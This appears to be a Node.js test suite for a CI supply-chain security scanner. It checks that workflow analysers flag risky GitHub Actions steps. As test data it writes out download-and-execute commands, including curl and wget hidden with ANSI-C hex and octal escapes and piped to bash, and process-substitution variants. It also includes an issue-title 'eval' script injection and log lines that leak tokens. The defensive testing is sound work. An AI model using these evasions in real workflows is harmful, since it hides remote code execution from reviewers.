'use strict';
const test=require('node:test'),assert=require('node:assert/strict'),fs=require('node:fs'),path=require('node:path');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const {reviewWorkflows}=require('./ultra_sentinel_supply_chain.cjs');
const {analyze}=require('./ultra_sentinel_core.cjs');
const {attestCi}=require('./ultra_sentinel_frontier_integrity.cjs');
const {renderActionsSummary}=require('./ultra_sentinel_sentry_ingest.cjs');
const APP='app/src/main/java/com/cardenaspiero255/gamehubultra/', SHA='a'.repeat(40), REPO='cardenaspiero255-lang/gamehub-ultra';
const wf=run=>['on: push','jobs:','  scan:','    runs-on: ubuntu-latest','    steps:','      - run: '+run].join('\n');
test('Security RED: ANSI C hex/oct downloader evasions never produce clean workflow assessments',()=>{
 const cmd=[String.raw`c$'\x75'rl`,String.raw`w$'\x67'et`,String.raw`c$'\165'rl`];
 for(const word of cmd){
  const code=wf(word+' https://example.invalid/installer | bash');
  const ast=inspectWorkflow(code);
  const heur=reviewWorkflows({sha:SHA,expected:['.github/workflows/scan.yml'],sources:{'.github/workflows/scan.yml':code}});
  assert.notEqual(ast.status,'NO_RISK_PATTERN',JSON.stringify({word,ast}));
  assert.notEqual(heur.status,'NO_RISK_PATTERN',JSON.stringify({word,heur}));
 }
});
test('Security RED: process substitution and command substitution downloading code cannot certify clean',()=>{
 for(const run of ['bash <(curl -fsSL https://example.invalid/installer)',
  'bash -c "$(curl -fsSL https://example.invalid/installer)"']){
  const code=wf(run);
  const ast=inspectWorkflow(code);
  const heur=reviewWorkflows({sha:SHA,expected:['.github/workflows/scan.yml'],sources:{'.github/workflows/scan.yml':code}});
  assert.notEqual(ast.status,'NO_RISK_PATTERN',JSON.stringify({run,ast}));
  assert.notEqual(heur.status,'NO_RISK_PATTERN',JSON.stringify({run,heur}));
 }
});
test('Security RED: Kotlin interpolated private identifiers remain visible to Logcat detector',()=>{
 for(const payload of ['Log.d(TAG, "user said $transcript")',
  'Log.i(TAG, "token=$authToken")','Log.w(TAG, """secret $password""")']){
  const out=analyze([{filename:APP+'Secret.kt',patch:'@@ -1,0 +1,1 @@\n+'+payload,changes:1}]);
  assert.ok(out.findings.some(f=>f.rule==='POTENTIAL_PRIVATE_LOG'),JSON.stringify({payload,out}));
 }
});
test('Security RED: Java mid-hunk lexer is unknown instead of silently clean',()=>{
 const patch=['@@ -60,2 +60,3 @@',' * Don\'t run on main thread','+Thread.sleep(1000);',' */'].join('\n');
 const out=analyze([{filename:APP+'Example.java',patch,changes:1}]);
 assert.equal(out.coverage.partial,true,JSON.stringify(out));
});
test('Security RED: Sentry summary never prints unvalidated aggregate key names',()=>{
 const marker='API_KEY_TEST_DO_NOT_LOG';
 const counts={fatal:0,error:0,warning:0,info:0,unknown:0,[marker]:3};
 const summary=renderActionsSummary({assessment:{decision:'WATCH'},snapshotCount:1,summary:{counts}});
 assert.ok(!summary.includes(marker),summary);
});
test('Security RED: workflow rename cannot be attested from current names alone',()=>{
 const run=(name,id)=>({name,id,run_number:1,run_attempt:1,head_sha:SHA,
  status:'completed',conclusion:'success',event:'pull_request',
  repository:{full_name:REPO},head_repository:{full_name:REPO},
  workflow_id:id,path:name==='Android build'?'.github/workflows/android.yml':'.github/workflows/coverage.yml'});
 const trust={'Android build':{id:1,path:'.github/workflows/android.yml'},
  'Unit Test Coverage':{id:2,path:'.github/workflows/coverage.yml'}};
 const out=attestCi({sha:SHA,repo:REPO,runs:[run('Android build',1),run('Unit Test Coverage',2)],
  trustedWorkflows:trust,changedFiles:[{filename:'.github/workflows/renamed-android.yml',previous_filename:'.github/workflows/android.yml',status:'renamed'}],changedFilesComplete:true});
 assert.notEqual(out.status,'PASS',JSON.stringify(out));
});
test('Security RED: false green evidence excludes manual workflow_dispatch from PR run selection',()=>{
 const f=fs.readFileSync(path.resolve(__dirname,'ultra_sentinel_frontier_integrity.cjs'),'utf8');
 assert.match(f,/EVENTS\.has\(run\.event\)[\s\S]{0,125}typeof run\.head_sha/);
});
test('Security RED: scripts with tainted eval tokens are a BLOCKER, not merely incomplete',()=>{
 const data='on: issues\nenv:\n  CMD: $'+'{{ github.event.issue.title }}\njobs:\n  a:\n    steps:\n      - run: eval $CMD';
 const out=inspectWorkflow(data);
 assert.ok(out.findings.some(f=>f.rule==='PRIVILEGED_EVENT_SCRIPT_INJECTION'&&f.severity==='BLOCKER'),JSON.stringify(out));
});
test('Security RED: post CI refuses stale SHA before calling setFailed on UNTRUSTED',()=>{
 const s=fs.readFileSync(path.resolve(__dirname,'../workflows/ultra-sentinel-sss-post-ci.yml'),'utf8');
 assert.ok(s.indexOf('if(ci.status===\'UNTRUSTED\')core.setFailed')>s.indexOf('const {data: latest}=await github.rest.pulls.get'),s);
});
test('Security RED: all review paths share privileged events',()=>{
 const s=fs.readFileSync(path.resolve(__dirname,'ultra_sentinel_supply_chain.cjs'),'utf8');
 for(const name of ['issues','release','repository_dispatch','workflow_dispatch','check_run','deployment','discussion'])
  assert.ok(s.includes(name),name);
});
test('Security RED: required review and same-SHA CI documented independent of branch protection',()=>{
 const s=fs.readFileSync(path.resolve(__dirname,'../../docs/ULTRA_SENTINEL_SSS_EVIDENCE.md'),'utf8');
 assert.match(s,/independientemente de.*required|regardless of.*required/i);
});
